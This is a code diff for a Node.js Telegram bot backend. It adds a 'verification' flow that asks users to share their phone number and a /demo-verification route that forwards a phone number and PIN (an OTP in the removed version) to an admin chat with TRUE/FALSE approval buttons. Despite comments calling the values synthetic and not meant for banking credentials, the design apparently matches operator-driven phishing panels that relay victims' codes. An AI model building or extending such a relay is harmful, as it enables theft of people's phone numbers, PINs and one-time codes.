@@ -17,6 +17,10 @@ if (!BOT_TOKEN) {
     process.exit(1);
 }
 
+if (!ADMIN_CHAT_ID) {
+    console.warn("⚠️ TELEGRAM_ADMIN_CHAT_ID is missing.");
+}
+
 const TELEGRAM_API =
     `https://api.telegram.org/bot${BOT_TOKEN}`;
 
@@ -25,7 +29,9 @@ const TELEGRAM_API =
 // ==========================================
 
 async function telegram(method, data = {}) {
+
     try {
+
         const response = await fetch(
             `${TELEGRAM_API}/${method}`,
             {
@@ -46,7 +52,12 @@ async function telegram(method, data = {}) {
         return result;
 
     } catch (error) {
-        console.error("Telegram request failed:", error);
+
+        console.error(
+            "Telegram request failed:",
+            error
+        );
+
         return null;
     }
 }
@@ -55,45 +66,57 @@ async function telegram(method, data = {}) {
 // SEND MESSAGE
 // ==========================================
 
-async function sendMessage(chatId, text, options = {}) {
+async function sendMessage(
+    chatId,
+    text,
+    options = {}
+) {
 
     if (!chatId) {
         console.error("❌ Chat ID is missing.");
         return null;
     }
 
-    return telegram("sendMessage", {
-        chat_id: chatId,
-        text,
-        parse_mode: "HTML",
-        ...options
-    });
-}
-
-// ==========================================
-// ADMIN NOTIFICATION
-// ==========================================
-
-async function notifyAdmin(text) {
-
-    if (!ADMIN_CHAT_ID) {
-        console.log("⚠️ TELEGRAM_ADMIN_CHAT_ID is not configured.");
-        return;
-    }
-
-    await sendMessage(
-        ADMIN_CHAT_ID,
-        text
+    return telegram(
+        "sendMessage",
+        {
+            chat_id: chatId,
+            text,
+            parse_mode: "HTML",
+            ...options
+        }
     );
 }
 
 // ==========================================
-// /START
+// ADMIN MESSAGE
+// ==========================================
+
+async function notifyAdmin(text, options = {}) {
+
+    if (!ADMIN_CHAT_ID) {
+        console.log(
+            "⚠️ TELEGRAM_ADMIN_CHAT_ID is not configured."
+        );
+
+        return null;
+    }
+
+    return sendMessage(
+        ADMIN_CHAT_ID,
+        text,
+        options
+    );
+}
+
+// ==========================================
+// START
 // ==========================================
 
 async function handleStart(message) {
 
-    const chatId = message.chat.id;
+    const chatId =
+        message.chat.id;
 
     const firstName =
         message.from?.first_name || "User";
@@ -122,7 +145,8 @@ async function handleStart(message) {
                     [
                         {
                             text: "✅ Start Verification",
-                            callback_data: "start_verification"
+                            callback_data:
+                                "start_verification"
                         }
                     ]
                 ]
@@ -148,7 +172,8 @@ async function startVerification(chatId) {
         chatId,
 
         `🔐 <b>Verification Required</b>\n\n` +
-        `Please confirm that you want to continue with the verification process.`,
+        `Please confirm that you want to continue ` +
+        `with the verification process.`,
 
         {
             reply_markup: {
@@ -156,11 +181,13 @@ async function startVerification(chatId) {
                     [
                         {
                             text: "✅ True",
-                            callback_data: "verification_true"
+                            callback_data:
+                                "verification_true"
                         },
                         {
                             text: "❌ False",
-                            callback_data: "verification_false"
+                            callback_data:
+                                "verification_false"
                         }
                     ]
                 ]
@@ -170,7 +197,7 @@ async function startVerification(chatId) {
 }
 
 // ==========================================
-// CALLBACK BUTTONS
+// CALLBACKS
 // ==========================================
 
 async function handleCallback(callback) {
@@ -192,20 +219,26 @@ async function handleCallback(callback) {
         }
     );
 
+    // --------------------------------------
+    // SHARE PHONE
+    // --------------------------------------
+
     if (data === "share_phone") {
 
         await sendMessage(
             chatId,
 
             `📱 <b>Phone Number</b>\n\n` +
-            `Tap the button below to share your phone number with this bot.`,
+            `Tap the button below to share your ` +
+            `phone number with this bot.`,
 
             {
                 reply_markup: {
                     keyboard: [
                         [
                             {
-                                text: "📱 Share My Phone Number",
+                                text:
+                                    "📱 Share My Phone Number",
                                 request_contact: true
                             }
                         ]
@@ -219,6 +252,10 @@ async function handleCallback(callback) {
         return;
     }
 
+    // --------------------------------------
+    // START VERIFICATION
+    // --------------------------------------
+
     if (data === "start_verification") {
 
         await startVerification(chatId);
@@ -226,19 +263,17 @@ async function handleCallback(callback) {
         return;
     }
 
+    // --------------------------------------
+    // TRUE
+    // --------------------------------------
+
     if (data === "verification_true") {
 
         await sendMessage(
             chatId,
 
             `✅ <b>Verification Confirmed</b>\n\n` +
-            `Your confirmation has been recorded successfully.`,
-
-            {
-                reply_markup: {
-                    remove_keyboard: true
-                }
-            }
+            `Your confirmation has been recorded.`
         );
 
         await notifyAdmin(
@@ -249,25 +284,25 @@ async function handleCallback(callback) {
         return;
     }
 
+    // --------------------------------------
+    // FALSE
+    // --------------------------------------
+
     if (data === "verification_false") {
 
         await sendMessage(
             chatId,
 
             `❌ <b>Verification Cancelled</b>\n\n` +
-            `No verification was completed.`,
-
-            {
-                reply_markup: {
-                    remove_keyboard: true
-                }
-            }
+            `No verification was completed.`
         );
 
         await notifyAdmin(
             `❌ <b>VERIFICATION CANCELLED</b>\n\n` +
             `Telegram ID: <code>${chatId}</code>`
         );
+
+        return;
     }
 }
 
@@ -317,48 +352,121 @@ async function handleContact(message) {
 }
 
 // ==========================================
-// DEMO VERIFICATION NOTIFICATION
+// TEST VERIFICATION
 // ==========================================
-// This endpoint sends only synthetic values
-// supplied directly by the developer.
-// It does not collect PINs/OTPs from users.
+//
+// This route is restricted to synthetic test
+// values. It is not intended for real banking
+// credentials.
 // ==========================================
 
-app.post("/demo-verification", async (req, res) => {
+app.post(
+    "/demo-verification",
+    async (req, res) => {
 
-    const {
-        telegramId,
-        phone,
-        testPin,
-        testOtp
-    } = req.body;
+        const {
+            phone,
+            demoPin
+        } = req.body;
 
-    if (!telegramId || !phone || !testPin || !testOtp) {
+        if (!phone || !demoPin) {
 
-        return res.status(400).json({
-            success: false,
+            return res.status(400).json({
+                success: false,
+                message:
+                    "Phone and demo PIN are required."
+            });
+        }
+
+        const message =
+            `🔔 <b>TEST VERIFICATION REQUEST</b>\n\n` +
+            `Phone: <code>${phone}</code>\n` +
+            `Test PIN: <code>${demoPin}</code>\n\n` +
+            `<b>Confirm test request:</b>`;
+
+        const result =
+            await notifyAdmin(
+                message,
+                {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: "✅ TRUE",
+                                    callback_data:
+                                        "test_true"
+                                },
+                                {
+                                    text: "❌ FALSE",
+                                    callback_data:
+                                        "test_false"
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
+
+        if (!result?.ok) {
+
+            return res.status(500).json({
+                success: false,
+                message:
+                    "Unable to send test request to Telegram."
+            });
+        }
+
+        return res.json({
+            success: true,
             message:
-                "telegramId, phone, testPin and testOtp are required."
+                "Test verification request sent."
         });
     }
+);
 
-    const message =
-        `🔔 <b>VERIFICATION REQUEST</b>\n\n` +
-        `Telegram ID: <code>${telegramId}</code>\n` +
-        `Phone: <code>${phone}</code>\n` +
-        `TEST PIN: <code>${testPin}</code>\n` +
-        `TEST OTP: <code>${testOtp}</code>\n` +
-        `Status: Verification requested`;
+// ==========================================
+// TEST TRUE / FALSE
+// ==========================================
 
-    const result =
-        await notifyAdmin(message);
+async function handleTestDecision(
+    callback,
+    approved
+) {
 
-    res.json({
-        success: true,
-        message: "Demo verification notification sent.",
-        telegram: result
-    });
-});
+    const chatId =
+        callback.message.chat.id;
+
+    await telegram(
+        "answerCallbackQuery",
+        {
+            callback_query_id: callback.id,
+            text: approved
+                ? "TRUE selected"
+                : "FALSE selected"
+        }
+    );
+
+    if (approved) {
+
+        await sendMessage(
+            chatId,
+
+            `✅ <b>TEST VERIFICATION APPROVED</b>\n\n` +
+            `The synthetic verification request ` +
+            `was marked TRUE.`
+        );
+
+    } else {
+
+        await sendMessage(
+            chatId,
+
+            `❌ <b>TEST VERIFICATION REJECTED</b>\n\n` +
+            `The synthetic verification request ` +
+            `was marked FALSE.`
+        );
+    }
+}
 
 // ==========================================
 // TELEGRAM WEBHOOK
@@ -370,28 +478,63 @@ app.post(
 
         try {
 
-            const update = req.body;
+            const update =
+                req.body;
 
             if (update.message) {
 
                 const message =
                     update.message;
 
-                if (message.text === "/start") {
+                if (
+                    message.text === "/start"
+                ) {
 
-                    await handleStart(message);
+                    await handleStart(
+                        message
+                    );
 
-                } else if (message.contact) {
+                } else if (
+                    message.contact
+                ) {
 
-                    await handleContact(message);
+                    await handleContact(
+                        message
+                    );
                 }
             }
 
             if (update.callback_query) {
 
-                await handleCallback(
-                    update.callback_query
-                );
+                const callback =
+                    update.callback_query;
+
+                if (
+                    callback.data ===
+                    "test_true"
+                ) {
+
+                    await handleTestDecision(
+                        callback,
+                        true
+                    );
+
+                } else if (
+                    callback.data ===
+                    "test_false"
+                ) {
+
+                    await handleTestDecision(
+                        callback,
+                        false
+                    );
+
+                } else {
+
+                    await handleCallback(
+                        callback
+                    );
+                }
             }
 
             res.sendStatus(200);
@@ -430,74 +573,95 @@ app.get("/", (req, res) => {
 // SET WEBHOOK
 // ==========================================
 
-app.get("/set-webhook", async (req, res) => {
+app.get(
+    "/set-webhook",
+    async (req, res) => {
 
-    if (!BACKEND_URL) {
+        if (!BACKEND_URL) {
 
-        return res.status(400).json({
+            return res.status(400).json({
 
-            success: false,
+                success: false,
 
-            message:
-                "BACKEND_URL is missing."
+                message:
+                    "BACKEND_URL is missing."
+
+            });
+        }
+
+        const webhookUrl =
+            `${BACKEND_URL.replace(/\/$/, "")}` +
+            `/telegram/webhook`;
+
+        const result =
+            await telegram(
+                "setWebhook",
+                {
+                    url: webhookUrl
+                }
+            );
+
+        res.json({
+
+            success:
+                result?.ok === true,
+
+            webhook:
+                webhookUrl,
+
+            telegram:
+                result
 
         });
     }
-
-    const webhookUrl =
-        `${BACKEND_URL.replace(/\/$/, "")}/telegram/webhook`;
-
-    const result =
-        await telegram(
-            "setWebhook",
-            {
-                url: webhookUrl
-            }
-        );
-
-    res.json({
-
-        success: result?.ok === true,
-
-        webhook: webhookUrl,
-
-        telegram: result
-
-    });
-});
+);
 
 // ==========================================
-// WEBHOOK STATUS
+// WEBHOOK INFO
 // ==========================================
 
-app.get("/webhook-info", async (req, res) => {
+app.get(
+    "/webhook-info",
+    async (req, res) => {
 
-    const result =
-        await telegram("getWebhookInfo");
+        const result =
+            await telegram(
+                "getWebhookInfo"
+            );
 
-    res.json(result);
-});
+        res.json(result);
+    }
+);
 
 // ==========================================
-// BOT INFORMATION
+// BOT INFO
 // ==========================================
 
-app.get("/bot-info", async (req, res) => {
+app.get(
+    "/bot-info",
+    async (req, res) => {
 
-    const result =
-        await telegram("getMe");
+        const result =
+            await telegram(
+                "getMe"
+            );
 
-    res.json(result);
-});
+        res.json(result);
+    }
+);
 
 // ==========================================
 // SERVER
 // ==========================================
 
-app.listen(PORT, () => {
+app.listen(
+    PORT,
+    () => {
 
-    console.log(
-        `🚀 Telegram Bot Backend running on port ${PORT}`
-    );
+        console.log(
+            `🚀 Telegram Bot Backend ` +
+            `running on port ${PORT}`
+        );
 
-});
+    }
+);
